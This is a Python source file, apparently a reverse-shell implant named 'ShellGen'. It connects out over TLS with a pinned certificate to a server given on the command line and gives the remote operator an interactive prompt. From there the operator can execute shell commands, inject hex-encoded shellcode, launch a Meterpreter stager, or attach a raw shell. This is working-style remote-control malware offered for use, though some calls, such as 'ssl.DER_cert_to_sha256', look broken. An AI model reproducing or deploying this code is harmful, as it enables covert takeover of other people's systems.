import logging
import argparse
import socket
import ssl
import shlex
from shell import Shell
from meterpreter import meterpreter_meterpreter


def interactive_shell(conn):
    shell = Shell()
    prompt = "[ShellGen]> "
    while True:
        try:
            conn.sendall(prompt.encode())
            command = conn.recv(1024).decode().strip()
            if len(command) > 1:
                argv = shlex.split(command)
                if argv[0] == "meterpreter":
                    if len(argv) > 2:
                        transport = argv[1]
                        address = argv[2]
                        ok, err = meterpreter_meterpreter(transport, address)
                        if not ok:
                            conn.sendall((err + "\n").encode())
                    else:
                        conn.sendall("Usage: meterpreter [tcp|http|https] IP:PORT\n".encode())
                elif argv[0] == "inject":
                    if len(argv) > 1:
                        shellcode = argv[1]
                        shellcode = bytes.fromhex(shellcode)
                        shellcode_length = len(shellcode)
                        if shellcode_length > 0:
                            shell.InjectShellcode(shellcode)
                elif argv[0] == "exit":
                    break
                elif argv[0] == "run_shell":
                    conn.sendall("Here is your original shell: \n".encode())
                    run_shell(conn)
                else:
                    shell.ExecuteCmd(command, conn)
        except Exception as e:
            logging.error(f"Error while executing command: {e}")


def run_shell(conn):
    shell = Shell()
    cmd = shell.GetShell()
    cmd.stdout = conn
    cmd.stderr = conn
    cmd.stdin = conn
    cmd.run()


def check_key_pin(conn, fingerprint):
    try:
        cert = conn.getpeercert(binary_form=True)
        if cert:
            cert_hash = ssl.DER_cert_to_sha256(cert)
            if cert_hash == fingerprint:
                return True
    except Exception as e:
        logging.error(f"Error while verifying fingerprint: {e}")
    return False


def reverse(connect_string, fingerprint):
    conn = None
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = ctx.wrap_socket(socket.socket(socket.AF_INET), server_hostname=connect_string, )
        conn.connect((connect_string, 443))
        if not check_key_pin(conn, fingerprint):
            raise Exception("Bad fingerprint")
        interactive_shell(conn)
    except Exception as e:
        logging.error(f"Error while connecting to server: {e}")
    finally:
        if conn:
            conn.close()


if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("connect_string", help="server to connect to")
    parser.add_argument("fingerprint", help="SSL/TLS certificate fingerprint")
    args = parser.parse_args()

    # Convert fingerprint to bytes
    fingerprint_bytes = bytes.fromhex(args.fingerprint.replace(':', ''))

    # Configure logging
    logging.basicConfig(filename='shellgen.log', level=logging.DEBUG)

    # Start reverse shell
    reverse(args.connect_string, fingerprint_bytes)
